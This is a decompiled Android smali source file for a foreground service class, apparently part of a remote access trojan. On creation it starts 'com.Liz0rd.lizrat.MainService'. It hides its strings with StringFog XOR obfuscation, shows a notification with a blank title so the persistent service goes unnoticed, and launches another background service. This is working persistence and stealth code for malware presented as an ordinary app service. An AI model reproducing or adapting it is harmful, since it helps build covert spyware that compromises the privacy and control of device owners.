.class public Lsigma/male/ForegroundService;
.super Landroid/app/Service;
.source "ForegroundService.java"


# static fields
.field public static final CHANNEL_ID:Ljava/lang/String;


# instance fields
.field notification:Landroid/app/Notification;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "Ezs0SF8nOzNDXAYxNFtRNjEFRVk7OiNB"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lsigma/male/ForegroundService;->CHANNEL_ID:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private createNotificationChannel()V
    .locals 4

    .prologue
    .line 72
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 73
    new-instance v1, Landroid/app/NotificationChannel;

    .line 74
    sget-object v0, Lsigma/male/ForegroundService;->CHANNEL_ID:Ljava/lang/String;

    .line 75
    const-string v2, "ZHJ2Y3QM"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 76
    const/4 v3, 0x1

    .line 73
    invoke-direct {v1, v0, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 78
    const-class v0, Landroid/app/NotificationManager;

    invoke-virtual {p0, v0}, Lsigma/male/ForegroundService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    .line 79
    invoke-virtual {v0, v1}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 81
    :cond_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 68
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 0

    .prologue
    .line 24
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-static {}, Lcom/Liz0rd/lizrat/MainService;->start()V

    .line 25
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 63
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 64
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5

    .prologue
    const v4, 0x7f07008f

    const/4 v3, 0x0

    .line 31
    const-string v0, "PDo2WEwQLDJfWQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 32
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lsigma/male/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 33
    invoke-static {p0, v3, v1, v3}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 36
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_1

    .line 38
    invoke-direct {p0}, Lsigma/male/ForegroundService;->createNotificationChannel()V

    .line 40
    new-instance v1, Landroidx/core/app/NotificationCompat$Builder;

    sget-object v2, Lsigma/male/ForegroundService;->CHANNEL_ID:Ljava/lang/String;

    invoke-direct {v1, p0, v2}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 41
    const-string v2, " "

    invoke-virtual {v1, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 42
    invoke-virtual {v1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 43
    invoke-virtual {v0, v4}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 44
    invoke-virtual {v0}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    .line 40
    iput-object v0, p0, Lsigma/male/ForegroundService;->notification:Landroid/app/Notification;

    .line 56
    :cond_0
    :goto_0
    const/4 v0, 0x1

    iget-object v1, p0, Lsigma/male/ForegroundService;->notification:Landroid/app/Notification;

    invoke-virtual {p0, v0, v1}, Lsigma/male/ForegroundService;->startForeground(ILandroid/app/Notification;)V

    .line 57
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lsigma/male/ForegroundService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lsigma/male/servicess;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lsigma/male/ForegroundService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 58
    const/4 v0, 0x2

    return v0

    .line 47
    :cond_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x15

    if-lt v1, v2, :cond_0

    .line 48
    new-instance v1, Landroidx/core/app/NotificationCompat$Builder;

    sget-object v2, Lsigma/male/ForegroundService;->CHANNEL_ID:Ljava/lang/String;

    invoke-direct {v1, p0, v2}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 49
    const-string v2, " "

    invoke-virtual {v1, v2}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    .line 50
    invoke-virtual {v1, v0}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 51
    invoke-virtual {v0, v4}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 52
    invoke-virtual {v0}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    .line 48
    iput-object v0, p0, Lsigma/male/ForegroundService;->notification:Landroid/app/Notification;

    goto :goto_0
.end method
